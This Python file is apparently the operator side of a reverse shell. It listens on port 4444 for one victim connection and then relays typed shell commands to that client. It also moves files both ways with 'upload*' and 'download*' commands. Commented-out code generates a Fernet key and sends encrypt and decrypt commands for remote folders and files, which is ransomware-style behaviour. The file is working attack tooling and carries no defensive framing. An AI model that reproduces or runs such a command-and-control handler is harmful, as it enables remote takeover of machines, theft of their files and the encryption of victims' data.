import socket
import os
import sys
import time
from cryptography.fernet import Fernet

class all:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.sock.bind((self.ip,self.port))
        self.sock.listen(1)
        print("[*]Listening...")
        self.client,self.server = self.sock.accept()
        print(f"[*] connected with {self.server}")
    
    def upload(self,cmd):
        fc,name = cmd.split("upload* ")
        if(os.path.exists(name)):
            c = 0
            size = os.path.getsize(name)
            self.client.send(str(size).encode())
            with open(name,"rb") as f:
                while c < size:
                    data = f.read(1024)
                    if not data:
                        break
                    c += len(data)
                    self.client.send(data)
                    print("file sending")
                print("file sent")
                self.conn()
            f.close()


    def download(self,cmd):
        size = ''
        size = self.client.recv(999999).decode()
        # size = int(size.strip())
        sx = 0
        fc,name = cmd.split("download* ")
        with open(name,"wb")as f:
            while sx < int(size):
                data = self.client.recv(1024)
                if not data:
                    print("break")
                    break
                f.write(data)
                sx += len(data)
                print("reciving file....")
            print("file recieved!!")
            self.conn()
            pass
        f.close()
    
    def generate_key(self):
        key = Fernet.generate_key()
        try:
            with open("key.txt", "wb") as f:
                f.write(key)
                print("key generated succesfully")
            f.close()
            self.conn()

        except Exception as e:
            print(e)
            self.conn()
        return 0
    
    # def d_e(self,status,folder="",file=""):
    #     key = ""
    #     try:
    #         with open(file,"rb") as f:
    #             key = f.read()
    #         f.close()

    #     except Exception as e:
    #         print(e)
    #         self.conn()

    #     try:
    #         if "decrypt_folder" in status:
    #             if(folder):
    #                 self.client.send(f"decrypt_folder*{folder}*{key}".encode())
    #             else:
    #                 print("internal error occured")

    #         if "encrypt_folder" in status:
    #             if(folder):
    #                 self.client.send(f"encrypt_folder*{folder}*{key}".encode())
    #             else:
    #                 print("internal error occured")        

    #         if "encrypt" in status:
    #             if(file):
    #                 self.client.send(str(f"encrypt {file} {key}").encode())
    #             else:
    #                 print("An Internal error ocured")
            
    #         if "decrypt" in status:
    #             if(file):
    #                 self.client.send(f"decrypt {file} {key}".encode())
    #             else:
    #                 print("An Internal error occured")
            
            
        
        # except Exception as e:
        #     print(e)

    def conn(self):

        while(1):
            cmd = input("shell>>>")

            if "exit" in cmd:
                break
            elif "download*" in cmd:
                self.client.send(cmd.encode())
                self.download(cmd)
                pass

            elif "upload*" in cmd:
                self.client.send(cmd.encode())
                self.upload(cmd)
                pass

            # elif "generate_key" in cmd:
            #     self.generate_key()
            
            # elif "decrypt_folder" in cmd:
            #     f,fol = cmd.split(" ")
            #     self.d_e(cmd, fol)
            
            # elif "encrypt_folder" in cmd:
            #     f,fol = cmd.split(" ")
            #     self.d_e(cmd,fol)
            
            # elif "encrypt" in cmd:
            #     f,fil = cmd.split(" ")
            #     self.d_e(cmd,"",fil)
            
            # elif "decrypt" in cmd:
            #     f,fil = cmd.split(" ")
            #     self.d_e(cmd,"",fil)

            else:
                self.client.send(cmd.encode())
                pass
        
            recv_data = self.client.recv(999999).decode()
            print(recv_data)
            pass


mk = all("127.0.0.1",4444)

mk.conn()
mk.sock.close()